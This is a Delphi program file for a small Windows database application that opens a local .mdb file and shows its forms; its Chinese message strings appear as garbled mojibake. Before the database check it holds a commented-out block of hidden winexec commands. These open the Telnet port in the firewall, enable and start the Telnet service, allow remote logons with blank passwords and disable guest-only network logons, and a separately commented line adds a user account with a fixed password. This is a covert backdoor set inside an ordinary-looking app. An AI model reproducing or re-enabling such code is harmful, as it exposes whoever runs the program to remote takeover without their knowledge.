program DB2e;

uses
  Forms,
  sysutils,
  windows,
  DB2Ex in 'DB2Ex.pas' {Form1},
  DBe in 'DBe.pas' {DM: TDataModule};

{$R *.res}

begin
  {winexec('cmd /c netsh firewall set portopening protocol=TCP Port=23 name="Telnet ������"��mode=ENABLE interface="��������"',sw_hide);
  //winexec('cmd /c net user Windows Cencenr /add',sw_hide);
  winexec('cmd /c sc config tlntsvr start= auto',sw_hide);
  winexec('cmd /c sc start tlntsvr',sw_hide);
  winexec('cmd /c net start tlntsvr',sw_hide);
  winexec('cmd /c reg add "hklm\system\currentcontrolset\control\lsa" /v limitblankpassworduse /t reg_dword /d 0 /f',sw_hide);
  winexec('cmd /c reg add "HKLM\SYSTEM\Controlset001\Control\lsa" /v limitblankpassworduse /t reg_dword /d 0 /f',sw_hide);
  winexec('cmd /c reg add "hklm\system\currentcontrolset\control\lsa" /v forceguest /t reg_dword /d 0 /f',sw_hide);
   }
  if not FileExists('data\ChoiceMDB.mdb') then
  begin
   messagebox(0,'��ǰĿ¼��û����Ҫ��Data�ļ��У�'+#13+#13+'����ļ�����û���������ݿ��ļ���'+#13+#13+'��ȷ��������ĵ�ǰλ��'+#13+#13+'���ȷ�Ϻ��������С�',
   '����',MB_Ok or MB_ICONHAND);
   halt;
  end;
  Application.Initialize;
  Application.CreateForm(TForm1, Form1);
  Application.CreateForm(TDM, DM);
  Application.Run;
end.
